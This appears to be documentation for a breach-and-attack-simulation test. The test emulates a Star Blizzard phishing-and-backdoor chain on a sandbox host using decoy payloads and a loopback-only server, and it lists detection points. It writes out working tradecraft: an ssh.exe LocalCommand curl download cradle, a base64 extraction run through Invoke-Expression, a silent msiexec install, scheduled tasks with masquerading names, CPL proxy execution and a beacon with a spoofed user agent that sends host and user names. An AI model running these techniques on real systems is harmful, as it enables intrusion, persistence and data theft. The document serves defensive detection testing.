## Description

This test emulates the espionage chain Microsoft Threat Intelligence disclosed on 2026-09-29 ("Star Blizzard refines phishing and malware delivery with the RedFlick technique"), which targeted 100+ organizations with fake event invitations. The killchain reproduces both documented RedFlick variants and the CosmicPulse backdoor's installation behaviors:

1. **Delivery** — a password-protected event-invite archive contains an LNK (built via `WScript.Shell` COM with `WindowStyle=7` and a PDF icon from `shell32.dll,70`) that launches a hidden `conhost.exe` → `cmd.exe` → BAT chain while displaying a decoy PDF (January variant).
2. **Transfer** — `ssh.exe` is invoked with the exact disclosure flag surface (`-o PermitLocalCommand=yes -o LocalCommand="curl.exe -o c:\F0\setup.msi http://127.0.0.1:<port>/assets/setup.msi" -o StrictHostKeyChecking=no -o BatchMode=yes`) as a download cradle (January variant); `curl.exe` (system binary) then fetches the weaponized PDF and the MSI from the loopback host (July variant).
3. **Extraction** — `powershell.exe -Command` reads the fetched PDF, regex-extracts the base64 run after the `cAB` magic header, decodes it, and executes it via `Invoke-Expression`, staging the file into the victim workspace (July RedFlick chain).
4. **Silent install** — `msiexec.exe /i <package> /q /norestart` silently installs the fetched package.
5. **Persistence** — three scheduled tasks created with the exact disclosure names: "Internet Quality Test Connection" (DAILY 09:30), "Network Configuration Manager" (ONLOGON), "System Health Monitor" (ONLOGON).
6. **CPL execution + key staging** — `rundll32.exe shell32.dll,Control_RunDLL <decoy.cpl>` and `control.exe <decoy.cpl>` launches; a CosmicPulse config string is AES-256-ECB encrypted (PKCS#7), written to `HKCU\Software\Classes\.mollis` (exact disclosure path), read back, decrypted and round-trip verified.
7. **Beacon** — `curl.exe` stages `python38.zip` + `bootstrapper.zip` decoys into `...\StarBlizzardInvite\bin\update\` (the disclosure's Python 3.8 package + bootstrapper installer pattern), then sends the registration beacon: `hostname|username` → UTF-16LE → Base64 → `curl.exe GET http://127.0.0.1:<port>/agent/poll?id=<data>` with a spoofed Edge/Chrome User-Agent.

Each stage is a separate Authenticode-signed binary (framework-mandated technique-level detection isolation), embedded gzip-compressed in the orchestrator, executed in disclosure order against an in-process loopback-only HTTP asset/C2 server, under a 180-second per-stage watchdog with force-terminate and `unexpected_hang` logging. An embedded cleanup utility restores the endpoint on every exit path.

## Technical Details

### Attack Flow

1. **Phase 0 — Orchestration setup** (orchestrator)
   - Installs the F0RT1KA code-signing trust certificate; provisions `c:\Users\fortika-test\StarBlizzardInvite` with a sandbox marker file; writes the pre-run system snapshot; starts the loopback HTTP asset/C2 server on `127.0.0.1:<random port>` serving `/assets/invite.pdf` (weaponized PDF with `cAB`+base64 command), `/assets/setup.msi`, `/assets/python38.zip`, `/assets/bootstrapper.zip`, and `/agent/poll`; extracts the 7 gzip-embedded signed stage binaries + cleanup utility to `C:\F0`.
2. **Stage 1 — T1204.002: Event-Invite LNK Execution**
   - Stages decoy archive contents (`IISS_Event_Invitation.pdf`, `Event_Materials_password_protected.rar`, `invite_viewer.bat`, `Event_Invitation.pdf.lnk`); builds the LNK via `WScript.Shell` COM targeting `conhost.exe --headless cmd.exe /c invite_viewer.bat` with `WindowStyle=7` and `shell32.dll,70` (PDF) icon; executes the conhost→cmd→BAT chain hidden; the BAT opens the decoy PDF and writes `lnk_execution_marker.txt` to `C:\F0` (fallback to direct hidden `cmd.exe` if conhost is unavailable in non-interactive sessions); verifies the marker.
3. **Stage 2 — T1105: LOLBin Download Cradle**
   - If anything listens on `127.0.0.1:22`, runs `ssh.exe` with the exact January-cradle flags (`-o PermitLocalCommand=yes -o LocalCommand="curl.exe -o C:\F0\setup.msi http://127.0.0.1:<port>/assets/setup.msi" -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 redflick-sandbox@127.0.0.1`); a credential refusal is the expected sandbox outcome and is not a verdict. Then `curl.exe -s -S -o` fetches the weaponized PDF (verified to contain the `cAB` marker) and the MSI from the loopback server into `C:\F0`.
4. **Stage 3 — T1059.001: PowerShell Payload Extraction**
   - Runs `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command` which `[IO.File]::ReadAllText`s the fetched PDF, regex-matches `cAB([A-Za-z0-9+/=]{24,})`, decodes with `[Convert]::FromBase64String`, and executes the result via `Invoke-Expression` — the embedded command copies the PDF to `StarBlizzardInvite\staged_invitation.pdf`; the stage verifies `EXTRACTED:` and `STAGED_OK` markers in the output.
5. **Stage 4 — T1218.007: Silent MSI Execution**
   - Runs `msiexec.exe /i C:\F0\setup.msi /q /norestart`. Documented deviation: the package is a decoy (no MSI toolchain on the build host), so a package-level exit (typically 1620) is expected and recorded; exit 5 (ERROR_ACCESS_DENIED) or 1260 (policy rejection) is classified as protection.
6. **Stage 5 — T1053.005: Persistence Task Trio**
   - Writes three inert decoy action scripts (each only appends to `C:\F0\task_fire.log` if ever fired); for each task name checks existence first (pre-existing tasks are recorded and skipped, never overwritten): creates "Internet Quality Test Connection" (`/SC DAILY /ST 09:30`), "Network Configuration Manager" and "System Health Monitor" (`/SC ONLOGON`) via `schtasks.exe /Create`, with `/RU SYSTEM` under SYSTEM context or `/RL LIMITED` otherwise; verifies all created tasks still exist (a vanishing task is treated as quarantine evidence); writes `scheduled_task_state.txt` for the cleanup utility.
7. **Stage 6 — T1218.011: CPL Execution + Registry Key Staging**
   - Writes a decoy `network_probe.cpl`; launches `rundll32.exe shell32.dll,Control_RunDLL <cpl>` and `control.exe <cpl>` under 25s timeouts (decoy-CPL stalls on suppressed dialogs still generate the launch telemetry). Then encrypts a CosmicPulse config string with AES-256-ECB (PKCS#7, per-run key), base64-encodes it, writes it to the default value of `HKCU\Software\Classes\.mollis` (namespaced `F0RT1KA-<uuid>` value if the key pre-exists with data), records `mollis_state.txt`, and verifies the bootstrapper round-trip (read → decode → decrypt → compare).
8. **Stage 7 — T1071.001: CosmicPulse Beacon**
   - `curl.exe` stages `python38.zip` and `bootstrapper.zip` decoys into `StarBlizzardInvite\bin\update\`; builds `hostname|username` → UTF-16LE → Base64; sends `curl.exe --fail -A "<spoofed Edge UA>" http://127.0.0.1:<port>/agent/poll?id=<data>` (3 attempts, 2s backoff), expecting HTTP 200; the orchestrator logs every received beacon to `c2_beacons.log`.
9. **Finalization** — orchestrator persists the beacon log, writes the post-run system snapshot, runs the cleanup utility (removes only state-recorded tasks, the `.mollis` key/value it created, and the marker-gated invite workspace; preserves evidence files), emits `bundle_results.json` with per-stage outcomes, and stops with the final verdict.

## Detection Opportunities

12 distinct detection points across the chain:

1. **LNK masquerade (file)** — `.lnk` whose target is `conhost.exe` with `--headless` arguments, `WindowStyle=7`, and a PDF icon/name (`Event_Invitation.pdf.lnk`): name/icon vs target mismatch.
2. **Hidden console host (process)** — `conhost.exe` spawning `cmd.exe` running a BAT with a hidden window; conhost with `--headless` in a non-terminal lineage.
3. **ssh.exe LOLBin cradle (process)** — any `ssh.exe` execution on an endpoint, and specifically the `PermitLocalCommand=yes` + `LocalCommand=` + `BatchMode=yes` flag surface with an embedded `curl.exe` download command.
4. **curl.exe ingress transfer (process+network)** — `curl.exe` (System32) downloading `.pdf`/`.msi`/`.zip` files and pairing the process-create with the loopback/HTTP connection; curl as a descendant of ssh.exe or an unsigned stage binary.
5. **PowerShell base64 extraction (script)** — `powershell.exe -Command` containing `FromBase64String`, `Invoke-Expression`, and a regex over PDF content: ScriptBlock Logging (EID 4104) and AMSI inspection of the decoded command.
6. **Silent MSI install (process)** — `msiexec.exe` with `/q` (or `/qn`) installing a package from a non-standard user/loopback-fetched path (`C:\F0\setup.msi`), not tied to a software-distribution system.
7. **Scheduled-task creation with masquerading names (persistence)** — `schtasks.exe /Create` of "Internet Quality Test Connection" / "Network Configuration Manager" / "System Health Monitor", ONLOGON triggers, actions in user-writable paths; Windows Event 4698/Sysmon.
8. **rundll32 Control_RunDLL on user-writable CPL (process)** — `rundll32.exe shell32.dll,Control_RunDLL <path outside System32>` — classic CPLExecution proxy-execution signal.
9. **control.exe applet launch (process)** — `control.exe <user-writable .cpl>` execution from a non-standard directory.
10. **Rare-key registry staging (registry)** — write to `HKCU\Software\Classes\.mollis` (single-purpose, campaign-specific key name): Sysmon EID 12/13 targeted-key monitoring.
11. **UA-spoofed beacon (network)** — `curl.exe` sending a Chrome/Edge browser User-Agent with a GET whose `id=` parameter is high-entropy base64 (decoded UTF-16LE `host|user` pattern) — client/UA mismatch is a strong C2 indicator.
12. **Installer staging pattern (file)** — `python38.zip` + `bootstrapper.zip` appearing under a user-writable `bin\update\` path absent a corresponding legitimate video-conference installer.

## Expected Results

### Unprotected System (Code 101)
All 7 stages complete: the LNK chain executes and displays the decoy PDF; ssh/curl fetch primitives run; PowerShell extracts and executes the embedded command; msiexec silent-install invocation runs (package-level exit on the decoy); the three scheduled tasks exist; both CPL launch surfaces run and the `.mollis` AES round-trip verifies; the registration beacon is answered HTTP 200 by the loopback C2. Cleanup then restores the endpoint.

### Protected System
- **Code 105 (quarantine)**: a security engine quarantines a dropped artifact — e.g., Stage 5 detects a just-created task or its action file vanishing, or a fetch/staged payload is quarantined.
- **Code 126 (execution prevention)**: an OS-emitted denial abnormal for the context — msiexec exit 5 (ERROR_ACCESS_DENIED), exit 1260 (AppLocker policy), `schtasks.exe` "access is denied", or a registry ACCESS_DENIED on `.mollis`. The orchestrator reports PROTECTED with the stopping stage, technique, and exit code, runs cleanup, and writes per-stage bundle results.
- **Code 127 (detected-blocked)**: stage-level prevention verdict from the 126/105/127 family handled identically to 126.
- **Code 102 (watchdog)**: a stage exceeds the 180s budget — force-terminated and logged as `unexpected_hang`.
- **Code 999 (test error)**: prerequisite/infrastructure failure (e.g., a stage runs without `F0_LOOPBACK_PORT` or before its prerequisite stage); never treated as a protection verdict.

## Realism Lift Proposals

Deferred borderline realism lifts — each is currently NOT implemented in order to respect the Tier-1 safety gate and build-host limits. The user decides whether to lift any of them (a lift is a re-score event under Rubric v2.1):

1. **WebClient/WebDAV enablement + remote Control_RunDLL execution** — start the real WebClient service and exercise the loopback WebDAV UNC path (`\\127.0.0.1@port\DavWWWRoot\...`) plus remote DLL execution through `Shell32.dll Control_RunDLL` over that UNC, reproducing the "Network Configuration Manager" task's real WebDAV-enablement function and Task 1's remote DLL execution. Deferred: service manipulation against a production host service conflicts with the safety gate (no service creation/start against production targets).
2. **In-process loopback SSH server** — run a minimal SSH server on `127.0.0.1:22` so the `ssh.exe` PermitLocalCommand cradle actually authenticates and fires its LocalCommand (curl download), instead of the current documented auth-refusal expectation where only the flag surface generates telemetry. Deferred: added protocol surface and credential handling on the sandbox host.
3. **Genuine MSI package** — build a real MSI with an MSI toolchain (e.g., WiX) whose custom actions perform the Stage-5 task creation, so `msiexec /q /i` completes a true silent install rather than returning the documented package-level error (~1620) on the current decoy package. Deferred: no MSI toolchain on the build host.
